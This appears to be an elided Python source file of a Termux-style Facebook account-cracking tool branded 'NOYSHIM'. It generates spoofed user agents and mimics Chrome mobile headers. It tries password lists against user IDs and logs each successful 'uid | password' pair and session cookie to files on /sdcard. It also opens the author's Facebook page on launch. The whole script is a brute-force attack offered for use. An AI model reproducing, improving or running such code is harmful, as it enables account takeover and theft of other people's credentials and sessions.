...
for ua in range(5000):
	...
	ugen.append(alhaj)
os.system("xdg-open https://www.facebook.com/Noyshim.504")
# LOGO
logo = ("""
...
def Main():
        ...
        print(logo)
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;32mRANDOM HACK NMq")
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK NOYSHIM-OK.txt')
    print(' [😁] CP NOYSHIM-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[NOYSHIM]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5796.210", "Google Chrome";v="114.0.5796.210"',
    'sec-ch-ua-mobile': '?1',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; 100015685-A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5796.210 Mobile Safari/537.36',
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mNOYSHIM-OK 😝\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[😜] COOKIE :\033[1;95m {coki}")
                open('/sdcard/NOYSHIM-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mNOYSHIM-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/NOYSHIM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
